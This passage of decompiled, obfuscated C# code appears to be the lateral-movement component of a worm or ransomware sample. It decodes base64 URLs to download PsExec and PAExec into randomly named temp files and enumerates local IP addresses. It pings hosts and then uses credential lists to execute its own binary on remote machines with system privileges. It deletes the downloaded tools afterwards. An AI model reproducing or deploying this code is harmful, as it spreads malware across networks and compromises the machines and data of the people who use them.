								sWSXzQkxHH.bhxKBVXCniiAP(JhbEnfJqtLoMYdD, "\\\\" + ip + " -u \"" + fbsFqkSfOX[i] + "\" -p \"" + eLXEIsiRrqw[i] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
							}
						}
					}
					else if (sWSXzQkxHH.XAoZigRKkvAz)
					{
						if (File.Exists(gYgDUYPsaASOBBW))
						{
							sWSXzQkxHH.bhxKBVXCniiAP(gYgDUYPsaASOBBW, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(JhbEnfJqtLoMYdD))
					{
						sWSXzQkxHH.bhxKBVXCniiAP(JhbEnfJqtLoMYdD, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(gYgDUYPsaASOBBW))
			{
				File.Delete(gYgDUYPsaASOBBW);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(JhbEnfJqtLoMYdD))
			{
				File.Delete(JhbEnfJqtLoMYdD);
			}
		}
		catch (Exception)
		{
		}
	}

	public static List<string> NGLHhFBFPvT()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string ScclTwURARDfE()
	{
		if (IntPtr.Size == 8)
		{
			return qBruChlvtye(new Uri(sWSXzQkxHH.agZtqMkMayfivgE("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
		}
		return qBruChlvtye(new Uri(sWSXzQkxHH.agZtqMkMayfivgE("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
	}

	public static string qYNozZMQbMv()
	{
		if (IntPtr.Size == 8)
		{
			return qBruChlvtye(new Uri(sWSXzQkxHH.agZtqMkMayfivgE("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWM2NC5leGU=")));
		}
		return qBruChlvtye(new Uri(sWSXzQkxHH.agZtqMkMayfivgE("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWMuZXhl")));
	}

	public static bool SwFwRiZSJvGME(string HEWgEojErYaL)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(HEWgEojErYaL);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string qBruChlvtye(Uri dVVYSfqMmZigf)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(dVVYSfqMmZigf, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> uDIrzDBiIrf()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration ");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item("IpEnabled"))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item("IPAddress");
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			foreach (string KjFJUboUuAzL in array4)
			{
				if (KjFJUboUuAzL.Contains(":"))
				{
					array = array.Where((string o) => o != KjFJUboUuAzL).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}
}
